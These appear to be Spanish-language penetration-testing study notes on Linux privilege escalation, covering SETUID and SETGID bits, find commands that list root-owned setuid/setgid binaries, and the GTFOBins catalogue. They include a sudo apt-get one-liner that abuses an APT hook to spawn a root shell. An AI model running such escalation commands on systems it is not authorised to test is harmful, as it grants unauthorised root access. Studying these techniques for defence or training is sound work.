
## SETUID

SETUID: puede permitir a un usuario ejecutar un programa o script con los permisos de otro usuario (normalmente con privs elevados)

Debe aparecer el bit `s` en los permisos:

```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
![[Pasted image 20260917154440.png]]

Podemos hacer ingenieria inversa de un programa SETUID, identificar una vuln y explotarla para escalar privs

## SETGID

SETGID: nos permite ejecutar binarios como si fueramos parte del grupo que lo creo:

```
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
![[Pasted image 20260917154623.png]]

## GTFOBins

[GTFOBins](https://gtfobins.github.io/): lista de binarios y scripts que pueden ser usados para evadir restricciones de seguridad

Ejemplo de apt-get para escapar de entornos restringidos y generar una shell:

```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
